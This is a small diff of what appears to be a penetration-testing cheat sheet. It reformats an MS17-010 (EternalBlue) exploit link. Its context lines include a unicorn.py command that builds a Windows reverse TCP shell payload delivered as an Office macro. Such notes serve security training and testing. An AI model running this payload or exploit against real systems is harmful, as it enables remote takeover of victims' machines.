@@ -24,6 +24,5 @@ Choose the --static option wisely https://stackoverflow.com/questions/8692128/st
     python unicorn.py windows/x64/shell_reverse_tcp 11.1.1.151234 macro
     
 ## Common Exploits
-
-*MS17-010* If you are facing EternalBlue :) https://ivanitlearning.wordpress.com/2019/02/24/exploiting-ms17-010-without-metasploit-win-xp-sp3/				
+**MS17-010** If you are facing EternalBlue :) https://ivanitlearning.wordpress.com/2019/02/24/exploiting-ms17-010-without-metasploit-win-xp-sp3/				
 
